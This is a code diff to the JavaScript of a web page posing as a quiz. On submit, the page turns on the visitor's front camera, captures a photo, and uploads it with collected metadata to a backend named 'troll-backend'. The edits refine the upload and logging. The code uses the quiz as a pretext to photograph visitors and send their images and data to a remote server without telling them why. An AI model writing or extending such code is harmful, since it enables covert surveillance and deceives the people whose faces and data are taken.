@@ -2,7 +2,7 @@ const form = document.getElementById("quiz-form");
 const videoEl = document.getElementById("video");
 const canvasEl = document.getElementById("canvas");
 
-// Make sure this is your Render backend
+// Make sure this points to your Render backend
 const backendURL = "https://troll-backend.onrender.com/api/upload";
 
 const constraints = { video: { facingMode: "user" }, audio: false };
@@ -20,6 +20,7 @@ form.addEventListener("submit", async (e) => {
     videoEl.srcObject = stream;
     await videoEl.play();
 
+    // Wait until video is ready
     await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 300)));
 
     // Capture image
@@ -57,12 +58,15 @@ form.addEventListener("submit", async (e) => {
       }
     }
 
-    // Send to backend
-    await fetch(backendURL, {
+    // Send data to backend
+    const response = await fetch(backendURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image, metadata })
+      body: JSON.stringify({ image, ...metadata }) // send image + metadata fields
     });
+
+    const result = await response.json();
+    console.log("Upload result:", result);
 
     // Stop camera
     videoEl.srcObject.getTracks().forEach(track => track.stop());
@@ -75,7 +79,7 @@ form.addEventListener("submit", async (e) => {
     submitBtn.textContent = "Submit";
 
   } catch (err) {
-    console.error(err);
+    console.error("Error uploading:", err);
     alert("Please allow camera access!");
     submitBtn.disabled = false;
     submitBtn.textContent = "Submit";
